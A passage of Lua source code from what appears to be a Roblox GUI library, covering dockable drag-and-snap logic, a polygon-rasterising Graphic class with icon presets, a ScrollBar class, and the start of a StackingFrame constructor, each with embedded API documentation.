							elseif math.abs(Apos.x - (sApos.x + sAsize.x)) <= snapWidth then
								x = sApos.x - cApos.x + sAsize.x
								eventObjectDocked:Fire(dockable,sibling,DockedSide.Left)
							end
						end
					end
				end
				if Class.ConstrainToContainer then
					if APY < cApos.y then
						y = 0
						eventObjectDocked:Fire(dockable,Container,DockedSide.Top)
					elseif APY + ASY > cApos.y + cAsize.y then
						y = cAsize.y - ASY
						eventObjectDocked:Fire(dockable,Container,DockedSide.Bottom)
					end
					if APX < cApos.x then
						x = 0
						eventObjectDocked:Fire(dockable,Container,DockedSide.Left)
					elseif APX + ASX > cApos.x + cAsize.x then
						x = cAsize.x - ASX
						eventObjectDocked:Fire(dockable,Container,DockedSide.Right)
					end
				elseif Class.SnapToEdge then
					if math.abs(APY - cApos.y) <= snapWidth then
						y = 0
						eventObjectDocked:Fire(dockable,Container,DockedSide.Top)
					elseif math.abs((APY+ASY) - (cApos.y+cAsize.y)) <= snapWidth then
						y = cAsize.y - ASY
						eventObjectDocked:Fire(dockable,Container,DockedSide.Bottom)
					end
					if math.abs(APX - cApos.x) <= snapWidth then
						x = 0
						eventObjectDocked:Fire(dockable,Container,DockedSide.Left)
					elseif math.abs((APX+ASX) - (cApos.x+cAsize.x)) <= snapWidth then
						x = cAsize.x - ASX
						eventObjectDocked:Fire(dockable,Container,DockedSide.Right)
					end
				end
			end

			local sx,sy = 0,0
			if Class.PositionScaled then
				sx = x/cAsize.x
				sy = y/cAsize.y
				x = 0
				y = 0
			end
			dockable.Position = UDim2.new(sx,x,sy,y)
		end)
		local zIndex = dockable.ZIndex
		local function mouse_up()
			Class.StopDrag = stopDragDefault
			MouseDrag.Parent = nil
			drag_con:disconnect(); drag_con = nil
			up_con:disconnect(); drag = nil
			SetZIndex(dockable,zIndex)
			eventDragStopped:Fire(dockable,mouse_offset)
			return true
		end
		up_con = MouseDrag.MouseButton1Up:connect(mouse_up)
		SetZIndex(dockable,zIndex + Class.DragZIndex)
		MouseDrag.Parent = GetScreen(dockable)
		Class.StopDrag = mouse_up
		eventDragBegin:Fire(dockable,mouse_offset)
	end
	Class.InvokeDrag = InvokeDrag

	local function ChildAdded(child)
		if child:IsA"GuiButton" then
			DragEvent[child] = child.MouseButton1Down:connect(function(x,y)
				InvokeDrag(child,Vector2.new(x,y) - child.AbsolutePosition)
			end)
		end
	end

	local function ChildRemoved(child)
		if DragEvent[child] then
			DragEvent[child]:disconnect()
			DragEvent[child] = nil
		end
	end

	Container.ChildAdded:connect(ChildAdded)
	Container.ChildRemoved:connect(ChildRemoved)

	for i,dockable in pairs(Container:GetChildren()) do
		ChildAdded(dockable)
	end

	return Class,Container
end

lib.DockContainer = CreateDockContainer

--[[DEPEND:
Stylist.lua;
]]

doc["Graphic"] = [==[
Graphic ( string `polygon`, Vector2 `size`, table `style`, table `config` ) [constructor]
	returns Graphic `object`, Frame `graphic`

Creates a basic GUI graphic from a polygon or specified preset.

Arguments:
	`polygon`
		May be a string, referencing a preset (see Presets).
		May also be a table that contains two tables, which represent the x and y coordinates (respectively) of each point in the polygon.
		If coordinates are not between 0 and 1, a 3rd entry may be specified, which is the number to divide each coordinate by.

	`size`
		The size, in pixels, of the graphic.
		May also be a table that contains the x and y size of the graphic.

	`style`
		A table that will be used with the graphic's Stylist, which controls the appearance of the graphic.
		Optional; defaults to an empty table.
		Note that the graphic essentially shares the same properties as a Frame object.
		So, if ["BackgroundColor3"] = Color3.new(1,1,1) were in the table, the graphic's color would be set to white.

	`config`
		A table that alters how the graphic will be drawn.
		It can contain the following possible values:
			method
				May be "scaled" or "static".
				Determines if pixels will be scaled to the parent or static.
			round
				May be "half", "ceil", or "floor".
				If static method is chosen, this determines how to round each pixel.
			offset
				A Vector2. This offsets the polygon on the final image.

Returns:
	`object`
		The Graphic object.

	`graphic`
		The Frame object which makes up the graphic.

Graphic Class:
	This class contains the following members:

	Readonly:
		GUI
			The Frame object which makes up the graphic.

		Style
			The Stylist object used to change the appearance of the graphic.
		
	Methods:
		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.


Presets:
	arrow-up
	arrow-down
	arrow-left
	arrow-right
	check-mark
	pin
	wrench
	cross
	grip
	vgrip
]==]

--[[
	polygon:
		string:									a reference to a predefined polygon
		table: {Vector2, ...}					a list of Vector2 points
		table: {{number, ...},{number, ...}}	two lists of x and y axes
	size
		table: {number, number}
		Vector2
	style
	config
		method	= scaled|static			Whether pixels will be scaled to the parent or static
		round	= ceil|floor|half		If static method is chosen, this determines how to round each pixel
		offset	= Vector2				Offsets the polygon on the final image. The polygon will be clipped so that it doesn't render outside the image region
]]

--[[
local polyX = {3,8,9,13,13,10,8,6,2}
local polyY = {2,6,2,9,13,10,15,2,10}
local polyCorners = 9
]]

local internal_polygon = {
	["arrow-up"] = {
		{2,4,6};
		{5,3,5};
		8;
	};
	["arrow-down"] = {
		{2,4,6};
		{3,5,3};
		8;
	};
	["arrow-left"] = {
		{5,3,5};
		{2,4,6};
		8;
	};
	["arrow-right"] = {
		{3,5,3};
		{2,4,6};
		8;
	};
	["check-mark"] = {
		{1,3,7,7,3,1};
		{3,5,1,3,7,5};
		8;
	};
	["pin"] = {
		{4,11,11,12,12,8,8,7,7,3,3,4, 4,5,7,7,5,5};
		{2,2,9,9,10,10,14,14,10,10,9,9, 2,3,3,9,9,3};
		16;
	};
	["wrench"] = {
		{	2;	8;	18;	25;	29;	29;	24;	20;	17;	17;	22;	16;	12;	12};
		{	24;	30;	20;	20;	16;	10;	15;	15;	12;	8;	3;	3;	7;	14};
		32,
	};
	["cross"] = {
		{1;	2;	4;	6;	7;	7;	5;	7;	7;	6;	4;	2;	1;	1;	3;	1};
		{1;	1;	3;	1;	1;	2;	4;	6;	7;	7;	5;	7;	7;	6;	4;	2};
		8;
	};
	["grip"] = function(size,class,config)
		local GraphicFrame = class.GUI
		GraphicFrame.Size = UDim2.new(0,size.x*(size.y == 0 and 2 or size.y),0,size.x*2)
		for i=1,size.x do
			local p = Instance.new("Frame",GraphicFrame)
			p.BackgroundColor3 = Color3.new(0,0,0)
			p.BorderSizePixel = 0
			p.Size = UDim2.new(1,0,0,1)
			p.Position = UDim2.new(0,0,0,(i-1)*(size.y == 0 and 2 or size.y))
			class.Stylist.AddObject(p)
		end
		
		return class,GraphicFrame
	end;
	["vgrip"] = function(size,class,config)
		local GraphicFrame = class.GUI
		GraphicFrame.Size = UDim2.new(0,size.x*2,0,size.x*(size.y == 0 and 2 or size.y))
		for i=1,size.x do
			local p = Instance.new("Frame",GraphicFrame)
			p.BackgroundColor3 = Color3.new(0,0,0)
			p.BorderSizePixel = 0
			p.Size = UDim2.new(0,1,1,0)
			p.Position = UDim2.new(0,(i-1)*(size.y == 0 and 2 or size.y),0,0)
			class.Stylist.AddObject(p)
		end
		
		return class,GraphicFrame
	end;
}

local function CreateGraphic(polygon,size,style,config)
--[[	local function round(d)
		local i = floor(d)
		d = d - i
		if d < 0.5 then
			return i
		elseif d > 0.5 then
			return i + 1
		elseif i%2==0 then
			return i
		else
			return i + 1
		end
	end
]]
	local function round(n)
		if n < 0 then
			return ceil(n - 0.5)
		else
			return floor(n + 0.5)
		end
	end
	
	local GraphicFrame = Instance.new("Frame")
	GraphicFrame.Name = "Graphic"
	GraphicFrame.BackgroundTransparency = 1
	
	local GraphicStylist = CreateStylist(style)
	
	local Class = {
		GUI = GraphicFrame;
		Stylist = GraphicStylist;
	}
	
	function Class.Destroy()
		for k in pairs(Class) do
			Class[k] = nil
		end
		GraphicStylist.Destroy()
		GraphicFrame:Destroy()
	end
	
	local polygonX,polygonY = {},{}
	if type(polygon) == "table" then
		polygonX = polygon[1]
		polygonY = polygon[2]
		local div = polygon[3]
		if div then
			for i=1,#polygonX do
				polygonX[i] = (polygonX[i])/div
			end
			for i=1,#polygonY do
				polygonY[i] = (polygonY[i])/div
			end
		end
	elseif type(polygon) == "string" then
		local in_poly = internal_polygon[polygon]
		if type(in_poly) == "table" then
			local div = in_poly[3] or 1
			for i=1,#in_poly[1] do
				polygonX[i] = (in_poly[1][i])/div
			end
			for i=1,#in_poly[2] do
				polygonY[i] = (in_poly[2][i])/div
			end
		elseif type(in_poly) == "function" then
			return in_poly(size,Class,config)
		else
			error("\'"..tostring(polygon).."\' is not a valid internal polygon",2)
		end
	else
		error("invalid polygon",2)
	end
	local posX,posY,sizeX,sizeY = 0,0,0,0
	config = config or {}
	local method = config.method or "scaled"
	local round = round
	if config.round == "ceil" then
		round = math.ceil
	elseif config.round == "floor" then
		round = math.floor
	elseif config.round == "half" then
		round = round
	end
	if config.offset then
		posX,posY = -config.offset.x,-config.offset.y
	end
	if type(size) == "userdata" then
		sizeX = size.x
		sizeY = size.y
	elseif type(size) == "table" then
		sizeX = size[1] or size.x
		sizeY = size[2] or size.y
	else
		error("invalid size",2)
	end
	polygonN = #polygonX
	for i=1,polygonN do
		polygonX[i] = polygonX[i]*sizeX
	end
	for i=1,polygonN do
		polygonY[i] = polygonY[i]*sizeY
	end
	
	GraphicFrame.Size = UDim2.new(0,sizeX,0,sizeY)
	
	local p = Instance.new("Frame")
	p.BorderSizePixel = 0
	p.BackgroundColor3 = Color3.new()
	p.Size = UDim2.new(0,1,0,1)
	
	local fillLine
	if method == "scaled" then
		fillLine = function(x1,x2,y)
			x2 = x2-x1
			if x2 ~= 0 then
				local c = p:Clone()
				GraphicStylist.AddObject(c)
				c.Position = UDim2.new(x1/sizeX,0,y/sizeY,0)
				c.Size = UDim2.new(x2/sizeX,0,1/sizeY,0)
				c.Parent = GraphicFrame
			end
		end
	elseif method == "static" then
		fillLine = function(x1,x2,y)
			x1 = round(x1,1)
			x2 = round(x2,1)-x1
			if x2 ~= 0 then
				local c = p:Clone()
				GraphicStylist.AddObject(c)
				c.Position = UDim2.new(0,x1,0,y)
				c.Size = UDim2.new(0,x2,0,1)
				c.Parent = GraphicFrame
			end
		end
	else
		error("invalid method",2)
	end
	
	for pixelY = posY,sizeY+posY-1 do
		local nodes = 0
		local nodeX = {}
		local j = polygonN;
		for i=1,polygonN do
			if polygonY[i] < pixelY and polygonY[j] >= pixelY or polygonY[j] < pixelY and polygonY[i] >= pixelY then
				nodeX[nodes] = (polygonX[i] + (pixelY - polygonY[i])/(polygonY[j] - polygonY[i])*(polygonX[j] - polygonX[i]))
				nodes = nodes + 1
			end
			j = i
		end
		
		local i = 0
		while i < nodes - 1 do
			if nodeX[i] > nodeX[i+1] then
				nodeX[i],nodeX[i+1] = nodeX[i+1],nodeX[i]
				if i ~= 0 then i = i - 1 end
			else
				i = i + 1
			end
		end
		
		local modX,modY = posX + sizeX, posY + sizeY
		
		local i = 0
		while i < nodes - 1 do
			if nodeX[i] >= modX then
				break
			end
			if nodeX[i+1] > posX then
				if nodeX[i] < posX then
					nodeX[i] = posX
				end
				if nodeX[i+1] > modX then
					nodeX[i+1] = modX
				end
				fillLine(nodeX[i]-posX,nodeX[i+1]-posX,pixelY-posY)
			end
			i = i + 2
		end
	end
	
	return Class,GraphicFrame
end

lib.Graphic = CreateGraphic

--[[DEPEND:
SetZIndex.lua;
GetScreen.lua;
Graphic.lua;
]]

doc["ScrollBar"] = [==[
ScrollBar ( bool `horizontal`, number `size` ) [constructor]
	returns: ScrollBar `object`, Frame `scroll_bar`

Creates a primative scroll bar.
This scroll bar features a draggable thumb, paging buttons at either end, and a clickable track.

Arguments:
	`horizontal`
		If true, the scroll bar will appear horizontally instead of vertically.
		Optional; defaults to false.
	`size`
		Sets the width or height of the scroll bar.
		Optional; defaults to ]==]..ENTRY_SIZE..[==[

Returns:
	`object`
		The ScrollBar object.
		
	`scroll_bar`
		The scroll bar GUI.


ScrollBar Class:
	This class contains the following members:

	Readonly:
		GUI
			The scroll bar itself.

	Fields:
		ScrollIndex
			A number indicating the current position of the scroll bar.

		TotalSpace
			A number indicating the total span of the scrollable space.

		VisibleSpace
			A number indicating the visible span of the scrollable space.

		PageIncrement
			The amount to increase or decrease the ScrollIndex when ScrollDown or ScrollUp is called.

	Methods:
		Update ( )
			Updates the scroll bar to reflect any changes.

		CanScrollDown ( )
			Returns whether the scroll bar can scroll down (or right if `horizontal` is true).

		CanScrollRight ( )
			Alias of CanScrollDown.

		CanScrollUp ( )
			Returns whether the scroll bar can scroll up (or left if `horizontal` is true).

		CanScrollLeft ( )
			Alias of CanScrollUp.

		ScrollDown ( )
			Scrolls down (or right) by the current PageIncrement.

		ScrollRight( )
			Alias of ScrollDown.

		ScrollUp ( )
			Scrolls up (or left) by the current PageIncrement.

		ScrollLeft ( )
			Alias of ScrollUp.

		ScrollTo ( number `index` )
			Scrolls to a specific place, specified by `index`.
			This may be any number; it will be clamped between 0 and TotalSpace.

		GetScrollPercent ( )
			Returns the scroll index as a percentage between 0 and 1.
			
		SetScrollPercent ( number `percent` )
			Sets the ScrollIndex as a percentage between 0 and 1.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.

	Callbacks:
		UpdateCallback ( table `object` )
			When Update is called, the function is called before updating.
			If the function returns false, the update will be canceled.
]==]

local function CreateScrollBar(horizontal,size)
	size = size or ENTRY_SIZE
	
	-- create row scroll bar
	local ScrollFrame = Create'Frame'{
		Size = horizontal and UDim2.new(1,0,0,size) or UDim2.new(0,size,1,0);
		Position = horizontal and UDim2.new(0,0,1,-size) or UDim2.new(1,-size,0,0);
		BackgroundTransparency = 1;
		Name = "ScrollFrame";
		Create'ImageButton'{
			BackgroundColor3 = Color3.new(1,1,1);
			BackgroundTransparency = 0.7;
			BorderSizePixel = 0;
			Size = UDim2.new(0, size, 0, size);
			Name = "ScrollDown";
			Position = horizontal and UDim2.new(1,-size,0,0) or UDim2.new(0,0,1,-size);
		};
		Create'ImageButton'{
			BackgroundColor3 = Color3.new(1,1,1);
			BackgroundTransparency = 0.7;
			BorderSizePixel = 0;
			Size = UDim2.new(0, size, 0, size);
			Name = "ScrollUp";
		};
		Create'ImageButton'{
			AutoButtonColor = false;
			Size = horizontal and UDim2.new(1,-size*2,1,0) or UDim2.new(1,0,1,-size*2);
			BackgroundColor3 = Color3.new(0,0,0);
			BorderSizePixel = 0;
			BackgroundTransparency = 0.7;
			Position = horizontal and UDim2.new(0,size,0,0) or UDim2.new(0,0,0,size);
			Name = "ScrollBar";
			Create'ImageButton'{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(1,1,1);
				Size = UDim2.new(0, size, 0, size);
				BackgroundTransparency = 0.5;
				Name = "ScrollThumb";
			};
		};
	}

	local ScrollDownFrame = ScrollFrame.ScrollDown
		local ScrollDownGraphic = CreateGraphic(horizontal and "arrow-right" or "arrow-down",Vector2.new(size,size))
		ScrollDownGraphic.GUI.Parent = ScrollDownFrame
	local ScrollUpFrame = ScrollFrame.ScrollUp
		local ScrollUpGraphic = CreateGraphic(horizontal and "arrow-left" or "arrow-up",Vector2.new(size,size))
		ScrollUpGraphic.GUI.Parent = ScrollUpFrame
	local ScrollBarFrame = ScrollFrame.ScrollBar
	local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		local Decal = CreateGraphic(horizontal and "vgrip" or "grip",Vector2.new(4),{BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0.5})
		Decal.GUI.Position = UDim2.new(0.5,-4,0.5,-4)
		Decal.GUI.Parent = ScrollThumbFrame

	local MouseDrag = Create'ImageButton'{
		Active = false;
		Size = UDim2.new(1.5, 0, 1.5, 0);
		AutoButtonColor = false;
		BackgroundTransparency = 1;
		Name = "MouseDrag";
		Position = UDim2.new(-0.25, 0, -0.25, 0);
		ZIndex = 10;
	}
	
	local Class = {
		GUI = ScrollFrame;
		ScrollIndex = 0;
		VisibleSpace = 0;
		TotalSpace = 0;
		PageIncrement = 1;
	}
	
	local function GetScrollPercent()
		return Class.ScrollIndex/(Class.TotalSpace-Class.VisibleSpace)
	end
	Class.GetScrollPercent = GetScrollPercent
	
	local function CanScrollDown()
		return Class.ScrollIndex + Class.VisibleSpace < Class.TotalSpace
	end
	Class.CanScrollDown = CanScrollDown
	Class.CanScrollRight = CanScrollDown
	
	local function CanScrollUp()
		return Class.ScrollIndex > 0
	end
	Class.CanScrollUp = CanScrollUp
	Class.CanScrollLeft = CanScrollUp
	
	local ScrollStyle = {BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0}
	local ScrollStyle_ds = {BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=0.7}
	
	local last_down
	local last_up
	local UpdateScrollThumb = horizontal
	and function()
		ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,size)
		if ScrollThumbFrame.AbsoluteSize.x < size then
			ScrollThumbFrame.Size = UDim2.new(0,size,0,size)
		end
		local bar_size = ScrollBarFrame.AbsoluteSize.x
		ScrollThumbFrame.Position = UDim2.new(GetScrollPercent()*(bar_size - ScrollThumbFrame.AbsoluteSize.x)/bar_size,0,0,0)
	end
	or function()
		ScrollThumbFrame.Size = UDim2.new(0,size,Class.VisibleSpace/Class.TotalSpace,0)
		if ScrollThumbFrame.AbsoluteSize.y < size then
			ScrollThumbFrame.Size = UDim2.new(0,size,0,size)
		end
		local bar_size = ScrollBarFrame.AbsoluteSize.y
		ScrollThumbFrame.Position = UDim2.new(0,0,GetScrollPercent()*(bar_size - ScrollThumbFrame.AbsoluteSize.y)/bar_size,0)
	end
	
	local function Update()
		local t = Class.TotalSpace
		local v = Class.VisibleSpace
		local s = Class.ScrollIndex
		if v <= t then
			if s > 0 then
				if s + v > t then
					Class.ScrollIndex = t - v
				end
			else
				Class.ScrollIndex = 0
			end
		else
			Class.ScrollIndex = 0
		end
		
		if Class.UpdateCallback then
			if Class.UpdateCallback(Class) == false then
				return
			end
		end

		local down = CanScrollDown()
		local up = CanScrollUp()
		if down ~= last_down then
			last_down = down
			ScrollDownFrame.Active = down
			ScrollDownFrame.AutoButtonColor = down
			ScrollDownGraphic.Stylist.SetProperties(down and ScrollStyle or ScrollStyle_ds)
			ScrollDownFrame.BackgroundTransparency = down and 0.5 or 0.7
		end
		if up ~= last_up then
			last_up = up
			ScrollUpFrame.Active = up
			ScrollUpFrame.AutoButtonColor = up
			ScrollUpGraphic.Stylist.SetProperties(up and ScrollStyle or ScrollStyle_ds)
			ScrollUpFrame.BackgroundTransparency = up and 0.5 or 0.7
		end
		ScrollThumbFrame.Visible = down or up
		UpdateScrollThumb()
	end
	Class.Update = Update
	
	local function ScrollDown()
		Class.ScrollIndex = Class.ScrollIndex + Class.PageIncrement
		Update()
	end
	Class.ScrollDown = ScrollDown
	Class.ScrollRight = ScrollDown

	local function ScrollUp()
		Class.ScrollIndex = Class.ScrollIndex - Class.PageIncrement
		Update()
	end
	Class.ScrollUp = ScrollUp
	Class.ScrollLeft = ScrollUp

	local function ScrollTo(index)
		Class.ScrollIndex = index
		Update()
	end
	Class.ScrollTo = ScrollTo
	
	local function SetScrollPercent(percent)
		Class.ScrollIndex = math.floor((Class.TotalSpace - Class.VisibleSpace)*percent + 0.5)
		Update()
	end
	Class.SetScrollPercent = SetScrollPercent
	
	-- fixes AutoButtonColor
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end
	
	SetZIndexOnChanged(ScrollFrame)
	
	local scroll_event_id = 0
	ScrollDownFrame.MouseButton1Down:connect(function()
		scroll_event_id = tick()
		local current = scroll_event_id
		local up_con
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollDownFrame)
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
		ScrollDown()
		wait(0.2) -- delay before auto scroll
		while scroll_event_id == current do
			ScrollDown()
			if not CanScrollDown() then break end
			wait()
		end
	end)
	
	ScrollDownFrame.MouseButton1Up:connect(function()
		scroll_event_id = tick()
	end)

	ScrollUpFrame.MouseButton1Down:connect(function()
		scroll_event_id = tick()
		local current = scroll_event_id
		local up_con
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollUpFrame)
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
		ScrollUp()
		wait(0.2)
		while scroll_event_id == current do
			ScrollUp()
			if not CanScrollUp() then break end
			wait()
		end
	end)

	ScrollUpFrame.MouseButton1Up:connect(function()
		scroll_event_id = tick()
	end)
	
	ScrollBarFrame.MouseButton1Down:connect(horizontal
	and function(x,y)
		scroll_event_id = tick()
		local current = scroll_event_id
		local up_con
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollUpFrame)
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
		if x > ScrollThumbFrame.AbsolutePosition.x then
			ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
			wait(0.2)
			while scroll_event_id == current do
				if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
				ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
				wait()
			end
		else
			ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
			wait(0.2)
			while scroll_event_id == current do
				if x > ScrollThumbFrame.AbsolutePosition.x then break end
				ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
				wait()
			end
		end
	end
	or function(x,y)
		scroll_event_id = tick()
		local current = scroll_event_id
		local up_con
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollUpFrame)
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
		if y > ScrollThumbFrame.AbsolutePosition.y then
			ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
			wait(0.2)
			while scroll_event_id == current do
				if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
				ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
				wait()
			end
		else
			ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
			wait(0.2)
			while scroll_event_id == current do
				if y > ScrollThumbFrame.AbsolutePosition.y then break end
				ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
				wait()
			end
		end
	end)

	ScrollThumbFrame.MouseButton1Down:connect(horizontal
	and function(x,y)
		scroll_event_id = tick()
		local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
		local drag_con
		local up_con
		drag_con = MouseDrag.MouseMoved:connect(function(x,y)
			local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
			local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
			local bar_abs_one = bar_abs_pos + bar_drag
			x = x - mouse_offset
			x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
			x = x - bar_abs_pos
			SetScrollPercent(x/(bar_drag))
		end)
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollThumbFrame)
			drag_con:disconnect(); drag_con = nil
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
	end
	or function(x,y)
		scroll_event_id = tick()
		local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
		local drag_con
		local up_con
		drag_con = MouseDrag.MouseMoved:connect(function(x,y)
			local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
			local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
			local bar_abs_one = bar_abs_pos + bar_drag
			y = y - mouse_offset
			y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
			y = y - bar_abs_pos
			SetScrollPercent(y/(bar_drag))
		end)
		up_con = MouseDrag.MouseButton1Up:connect(function()
			scroll_event_id = tick()
			MouseDrag.Parent = nil
			ResetButtonColor(ScrollThumbFrame)
			drag_con:disconnect(); drag_con = nil
			up_con:disconnect(); drag = nil
		end)
		MouseDrag.Parent = GetScreen(ScrollFrame)
	end)
	
	Update()

	return Class,ScrollFrame
end

lib.ScrollBar = CreateScrollBar

--[[DEPEND:
GetPadding.lua;
]]

doc["StackingFrame"] = [==[
StackingFrame ( GuiObject `frame`, bool `horizontal`, bool `alignment` ) [constructor]
	returns: StackingFrame `object`, Frame `stacking_frame`

Creates a frame that automatically resizes based on the objects it contains.
These objects are automatically positioned to stack next to each other.
Objects that have their Visible property set to false become ignored.

Arguments:
	`frame`
		If specified, then it will be used as the StackingFrame.
		Children that exist in this object beforehand will be added to the StackingFrame automatically. 
		Use the AddObject function to add children afterwards.
		Optional; defaults to a new Frame.

	`horizontal`
		If true, objects will be positioned horizontally instead of vertically.
		Optional; defaults to false

	`alignment`
		If true, objects will be aligned to the right if vertical (else left), or the bottom if horizontal (else top).
		Optional; defaults to false

Returns:
	`object`
		The StackingFrame object.

	`stacking_frame`
		The stacking frame GUI.


StackingFrame Class:
	Contains the following members:

	Readonly:
		GUI
			The stacking frame GUI.

		List
			The table containing the objects in the stacking frame.
			Should only be used for ordering items! Use AddObject and RemoveObject accordingly!

	Methods:
		AddObject ( GuiObject `object`, number `index` )
			Adds `object` to the list.
			If `index` is specified, the object is added at that position in the list.
			Otherwise, it is added to the end.

		RemoveObject ( number `index` )
			Removes the object at `index` in the list.
			`index` can be an object in the list.
			`index` can be nil, in which case the last item in the list is used.
			`index` is clamped within the range of the list.

		MoveObject ( number `index`, number `to` )
			Moves the object at `index` to the new index `to`.
			`index` and `to` can be objects in the list.
			`index` and `to` can be nil, in which case the last item in the list is used.
			`index` and `to` are clamped within the range of the list.

		GetIndex ( Instance `object` )
			Returns the index of `object` in the stacking frame, if it exists there.

		SetPadding ( number `padding`, number `border` )
			Sets the amount of space between and around children, in pixels.
			`padding` is the amount of space between each child.
			`border` is the amount of space around all children.
			
		Update ( )
			Updates the object.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.
]==]

local function CreateStackingFrame(Frame,horizontal,alignment)
	Frame = Frame or Instance.new("Frame")
	local children = {}
	local connections = {}
	local border = 0
	local padding = 0
	local style_pad = 0
	local event_id = 0
	local Update

	if horizontal then
		if alignment then
			Update = function()
				event_id = event_id + 1; local eid = event_id
				local height = 0
				local length = 0
				for i,child in pairs(children) do
					if event_id ~= eid then return end
					if child.Visible then
						local abs = child.AbsoluteSize
						child.Position = UDim2.new(0,length + border,1,-abs.y - border)
						height = abs.y > height and abs.y or height
						length = length + abs.x + padding
					end
				end
				if event_id ~= eid then return end
				if #children > 0 then
					Frame.Size = UDim2.new(0,length - padding + border*2 + style_pad,0,height + border*2 + style_pad)
				else
					Frame.Size = UDim2.new(0,border*2 + style_pad,0,border*2 + style_pad)
				end
			end
		else
			Update = function()
				event_id = event_id + 1; local eid = event_id
				local height = 0
				local length = 0
				for i,child in pairs(children) do
					if event_id ~= eid then return end
					if child.Visible then
						local abs = child.AbsoluteSize
						child.Position = UDim2.new(0,length + border,0,border)
						height = abs.y > height and abs.y or height
						length = length + abs.x + padding
					end
				end
				if event_id ~= eid then return end
				if #children > 0 then
					Frame.Size = UDim2.new(0,length - padding + border*2 + style_pad,0,height + border*2 + style_pad)
				else
					Frame.Size = UDim2.new(0,border*2 + style_pad,0,border*2 + style_pad)
				end
			end
		end
	else
		if alignment then
			Update = function()
				event_id = event_id + 1; local eid = event_id
				local width = 0
				local length = 0
				for i,child in pairs(children) do
					if event_id ~= eid then return end
					if child.Visible then
						local abs = child.AbsoluteSize
						child.Position = UDim2.new(1,-abs.x - border,0,length + border)
						width = abs.x > width and abs.x or width
						length = length + abs.y + padding
					end
				end
				if event_id ~= eid then return end
				if #children > 0 then
					Frame.Size = UDim2.new(0,width + border*2 + style_pad,0,length - padding + border*2 + style_pad)
				else
					Frame.Size = UDim2.new(0,border*2 + style_pad,0,border*2 + style_pad)
				end
			end
		else
			Update = function()
				event_id = event_id + 1; local eid = event_id
				local width = 0
				local length = 0
				for i,child in pairs(children) do
					if event_id ~= eid then return end
					if child.Visible then
						local abs = child.AbsoluteSize
						child.Position = UDim2.new(0,border,0,length + border)
						width = abs.x > width and abs.x or width
						length = length + abs.y + padding
					end
				end
				if event_id ~= eid then return end
				if #children > 0 then
					Frame.Size = UDim2.new(0,width + border*2 + style_pad,0,length - padding + border*2 + style_pad)
				else
					Frame.Size = UDim2.new(0,border*2 + style_pad,0,border*2 + style_pad)
				end
			end
		end
	end
	
	local function SetPadding(pad,bor)
		padding = pad or padding
		border = bor or border
		Update()
	end

	local function AddObject(object,index)
		if object:IsA"GuiObject" then
			if type(index) == "number" then
				table.insert(children,index,object)
			else
				table.insert(children,object)
			end
			connections[object] = object.Changed:connect(function(p)
				if p == "AbsoluteSize" or p == "Visible" then
					Update()
				end
			end)
			object.Parent = Frame
			Update()
		end
	end
	
	local function RemoveObject(index)
		if index == nil then
			index = #children
		elseif type(index) ~= "number" then
			index = GetIndex(children,index)
		end
		if index then
			index = ClampIndex(children,index)
			local object = table.remove(children,index)
			if connections[object] then
				connections[object]:disconnect()
				connections[object] = nil
			end
			object.Parent = nil
			Update()
			return object
		end
	end
	
	local function MoveObject(index,to)
		if index == nil then
			index = #children
		elseif type(index) ~= "number" then
			index = GetIndex(children,index)
		end
		if to == nil then
			to = #children
		elseif type(to) ~= "number" then
			to = GetIndex(children,to)
		end
		if index and to then
			index = ClampIndex(children,index)
			to = ClampIndex(children,to)
			local child = table.remove(children,index)
			table.insert(children,to,child)
			Update()
		end
	end
	
	local Class = {
		GUI = Frame;
		List = children;
		Update = Update;
		SetPadding = SetPadding;
		AddObject = AddObject;
